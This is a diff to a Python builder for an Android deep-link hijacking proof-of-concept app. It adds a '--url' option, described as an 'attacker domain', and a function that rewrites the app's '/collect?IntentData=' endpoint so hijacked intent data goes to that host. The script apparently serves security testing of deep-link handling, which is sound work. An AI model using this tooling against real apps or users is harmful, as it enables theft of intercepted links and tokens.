@@ -8,10 +8,15 @@ import subprocess
 import shutil
 from pathlib import Path
 from lxml import etree
+import re
 
 PROJECT_DIR = Path("DeepLinkHijackingPoCApp")
 ANDROID_MANIFEST_PATH = PROJECT_DIR / "app/src/main/AndroidManifest.xml"
 APK_LOCATION = PROJECT_DIR / "app/build/outputs/apk/release/DeepLinkHijackingPoCApp-release.apk"
+JAVA_ACTIVITY_PATH = PROJECT_DIR / "app/src/main/java/com/example/deeplinkhijackingpoc/DeepLinkHijackActivity.java"
+COLLECT_PATTERN = re.compile(
+    r"https://[^/]+(/collect\?IntentData=)"
+)
 
 
 # -------------------------
@@ -86,6 +91,36 @@ def insert_deep_link(manifest_file: Path, deep_link: str) -> None:
 
     print(f"✅ Injected deep link: {parsed.scheme}://{parsed.netloc or '*'}")
 
+# -------------------------
+# URL Domain Replacement
+# -------------------------
+
+def replace_collect_domain(java_file: Path, new_domain: str) -> None:
+    if not java_file.exists():
+        raise FileNotFoundError(f"Java file not found: {java_file}")
+
+    content = java_file.read_text(encoding="utf-8")
+
+    matches = COLLECT_PATTERN.findall(content)
+    if not matches:
+        print("⚠️ No collect URL pattern found — nothing replaced")
+        return
+
+    # normalize input (strip scheme if user passed it)
+    new_domain = new_domain.replace("https://", "").replace("http://", "").strip("/")
+
+    # backup first
+    shutil.copy(java_file, java_file.with_suffix(".java.bak"))
+
+    def repl(match: re.Match) -> str:
+        return f"https://{new_domain}{match.group(1)}"
+
+    updated = COLLECT_PATTERN.sub(repl, content)
+
+    java_file.write_text(updated, encoding="utf-8")
+
+    print(f"✅ Replaced collect endpoint domain → {new_domain}")
+
 
 # -------------------------
 # Build APK
@@ -129,6 +164,11 @@ def main() -> None:
     )
 
     parser.add_argument(
+        "-u", "--url",
+        help="Define an attacker domain to extract the intent's data"
+    )
+
+    parser.add_argument(
         "-o", "--output",
         help="Copy built APK to this path"
     )
@@ -142,6 +182,8 @@ def main() -> None:
     args = parser.parse_args()
 
     insert_deep_link(ANDROID_MANIFEST_PATH, args.link)
+    if args.url:
+    	replace_collect_domain(JAVA_ACTIVITY_PATH, args.url)
     build_apk()
 
     if not APK_LOCATION.exists():
